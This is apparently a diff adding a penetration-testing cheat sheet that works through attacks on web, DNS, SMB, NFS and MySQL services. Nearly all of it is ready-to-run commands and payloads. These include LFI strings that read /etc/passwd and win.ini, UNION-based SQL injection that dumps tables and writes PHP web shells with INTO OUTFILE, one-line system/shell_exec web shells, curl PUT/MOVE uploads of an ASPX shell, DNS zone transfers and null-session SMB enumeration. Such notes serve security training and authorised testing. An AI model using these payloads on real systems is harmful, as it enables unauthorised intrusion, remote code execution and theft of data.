@@ -1,0 +1,216 @@
+### HTTP ###
+
+http://<victim_IP>/robots.txt
+
+DIRECTORY BRUTE FORCE
+
+#with dirb;
+dirb http://<victim_ip>/
+dirb http://<victim_ip>/ -r -o dirb.txt
+
+#with gobuster
+gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -o gobuster.txt
+gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -x html,php,asp,aspx -o gobuster.txt
+gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -k -x html,php,asp,aspx -o gobuster.txt
+
+#with wfuzz
+wfuzz --hc 404,400 -c -z file,/usr/share/dirb/wordlists/big.txt http://<victim_ip>/FUZZ
+
+#with dirsearch
+python3 dirsearch.py -u http://<victim_ip>/ -e php -x 403,404 -t 50 (Warning: This scan takes a long time to run)
+
+******************************************************************************************************************************
+
+VULNERABILITY SCAN
+
+#with nikto;
+nikto --host=http://<victim_ip>
+
+******************************************************************************************************************************
+
+LFI
+
+#for Linux;
+http://<victim_ip>test.php?page=../../../../etc/passwd          #basic
+http://<victim_ip>test.php?page=../../../etc/passwd             #null byte
+http://<victim_ip>test.php?page=%252e%252e%252fetc%252fpasswd   #double encoding
+
+
+for Windows;
+http://<victim_ip>/test.php?page=../../../../../WINDOWS/win.ini
+http://<victim_ip>/test.php?page=../../../../../xampp/apache/bin/php.ini
+
+******************************************************************************************************************************
+
+SQL Injection (Manual Steps)
+
+#Victim Address;
+ http://<victim_ip>/test.php?id=3'
+
+#Find the number of columns;
+ http://<victim_ip>/test.php?id=3 order by 5
+
+#Find space to output db
+ http://<victim_ip>/test.php?id=3 union select 1,2,3,4,5
+
+#Get db-username and db-version information from the database;
+ http://<victim_ip>/test.php?id=3 union select 1,2,version(),4,5
+ http://<victim_ip>/test.php?id=3 union select 1,2,user(),4,5
+
+#Get all tables;
+ http://<victim_ip>/test.php?id=3 union select 1,2,table_name,4,5 from information_schema.tables
+
+#Get all columns from a specific table;
+ http://<victim_ip>/test.php?id=3 union select 1,2, column_name 4,5 from information_schema.columns where table_name='wpusers'
+
+#Viewing files;
+ http://<victim_ip>/test.php?id=3' union select 1,2, load_file('/var/www/mysqli_connect.php') ,4,5 -- -
+ http://<victim_ip>/test.php?id=3' union select 1,2, load_file('/etc/passwd') ,4,5 -- -
+	
+#Uploading files;
+ http://<victim_ip>/test.php?id=3' union select null,null, load_file('/var/www/brc_shell.php') ,4,5 -- -
+ http://<victim_ip>/test.php?id=3' union select null,null, "<?php exec($_GET['cmd']) ?>" ,4,5 into outfile '/var/www/brc_shell.php' -- -	
+
+
+******************************************************************************************************************************
+
+SCENARIOS
+
+MySQL to SHELL
+
+#Put shell on db to victim system;
+ select 1,2,3,'<?php system($_GET[cmd]); ?>',6,7,8,9,10 INTO OUTFILE '/var/www/brc_shell.php';
+
+#Call the shell and code execution;
+ http://<victim_ip>/shell.php?cmd=ifconfig
+
+
+LFI to RCE
+#Inject shell to victim system;
+ <?php echo shell_exec($_GET["cmd"]); ?>
+ 
+#Call the shell and code execution;
+ http://<victim_ip>/shell.php?cmd=ls -la
+ 
+******************************************************************************************************************************
+
+CMS Enumeration
+
+#Wordpress
+ wpscan --url http://<victim_ip>/ --enumerate p --enumerate u --enumerate t
+
+#Joomla
+ joomscan -u  http://<victim_ip>/ --enumerate-components
+
+#Drupal
+ ./droopescan scan drupal -u <victim_ip>
+
+******************************************************************************************************************************
+
+CURL
+
+#Uploading files to the victim system and changing the extension of the file uploaded to the victim system;
+ echo worldofpentest > test.txt                       #create file
+ curl -X PUT http://<victim_ip>/brc.txt -d @test.txt  #put to target
+ curl http://<victim_ip>/brc.txt                      #call the file
+ 
+#Victim system put to shell  with curl;
+ cp /usr/share/webshells/aspx/cmdasp.aspx .
+ curl -X PUT http://<victim_ip>/brc_shell.txt -d @cmdasp.aspx
+ curl -X MOVE -H 'Destination:http://<victim_ip>/shell.aspx' http://<victim_ip>/brc_shell.txt
+  
+ Note: When we shell the victim system as above, we can get run time error in the system. 
+ The reason of this; the victim system noticed the shell we threw and erased the gaps.
+ 
+#To protect the spaces, we should use the command "--data-binary";
+ curl -X PUT http://<victim_ip>/brc_shell.txt --data-binary @shell.aspx
+ curl -X MOVE -H 'Destination:http://<victim_ip>/shell.aspx' http://<victim_ip>/brc_shell.txt
+
+******************************************************************************************************************************
+
+WebDAV Server Attacks
+
+#What types of files can I upload to the victim system?
+ davtest --url http://<victim_ip>
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+### DNS ###
+
+Firstly add the domain information detected during port scans to the file "/etc/hosts";
+
+#Then check the DNS servers;
+ dig ns <domain_name>
+
+ or
+
+ nslookup
+ server <victim_ip>
+
+#For zone transfer;
+ dig @ns1.example.com example.com axfr
+
+ or
+
+ host -l <domain_name> <victim_ip>
+
+ Note: "dnsrecon" tool can also be used for this.
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+### SMB ###
+
+#Controlling SMB shares;
+ smbmap -H <victim_ip>
+ 
+#Connect to SMB shares;
+ smbclient \\\\<victim_ip>\\share_name
+ smbclient \\\\<victim_ip>\\share_name -U mike
+ 
+#Check null sessions;
+ rpcclient -U "" -N <victim_ip>
+  > srvinfo
+  > enumdomusers
+  > getdompwinfo
+  > querydominfo
+ 
+ Note: It is found on old windows servers.
+ 
+#Enumerate SMB shares;
+ enum4Linux -a <victim_IP>
+
+#SMB version numbering script;
+ smbver.sh -> https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
+ 
+-------------------------------------------------------------------------------------------------------------------------------
+
+### NFS ###
+
+#Controlling public shares;
+ showmount -e <victim_ip>
+
+ Example shares;
+ /var
+ /asd
+
+#Mounting;
+ mkdir brc                   #Indexing
+ mount <victim_ip>:/var brc  #We mount the /var directory that is open on the target to the /brc directory that we have created on our own machine. 
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+### MySQL ###
+
+#Connecting to the MySQL;
+ mysql --host=INSERTIPADDRESS -u root -p
+ 
+#Listing databases;
+ show databases
+
+#Choosing a database;
+ use information_schema
+
+#Uploading the shell;
+ select 1,2,3,'<?php system($_GET[cmd]); ?>',6,7,8,9,10 INTO OUTFILE '/var/www/brc_shell.php';
+ 
+-------------------------------------------------------------------------------------------------------------------------------
